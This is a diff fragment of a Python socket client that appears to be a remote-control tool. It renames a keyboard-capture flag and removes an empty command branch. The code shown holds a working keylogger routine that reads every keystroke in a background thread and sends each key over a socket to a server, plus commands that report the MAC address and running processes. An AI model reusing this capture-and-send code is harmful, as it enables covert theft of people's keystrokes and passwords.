@@ -17,30 +17,30 @@ ClientMultiSocket = socket.socket()
 host = '127.0.0.1'
 port = 2004
 
-boolCatchKeyboard = False
+isCatchKeyboard = False
 isNotLockKeyboard = True
 recording = False
 
 def CatchKeyboard(message):
-    global boolCatchKeyboard
+    global isCatchKeyboard
     ClientMultiSocket.send(str.encode(message))
             
-    boolCatchKeyboard = True
+    isCatchKeyboard = True
 
     def sendKeyboard():
-        global boolCatchKeyboard
-        while boolCatchKeyboard:  # making a loop
+        global isCatchKeyboard
+        while isCatchKeyboard:  # making a loop
             char = keyboard.read_key()
             if char:   
                 print(char)
-                if (boolCatchKeyboard):
+                if (isCatchKeyboard):
                     ClientMultiSocket.send(str.encode(char))
         
     start_new_thread(sendKeyboard, ())
 
 def EndCatchKeyboard():
-    global boolCatchKeyboard
-    boolCatchKeyboard = False
+    global isCatchKeyboard
+    isCatchKeyboard = False
     ClientMultiSocket.send(str.encode("EnDCatCh"))
     ClientMultiSocket.send(str.encode("end"))
 
@@ -178,10 +178,6 @@ try:
 
         if (message == "getMacAddress"):
             GetMacAddress(message)
-
-        if (message == "showFolderTree"):
-            
-            pass
 
         if (message == "showProcesses"):
             ShowProcesses(message)
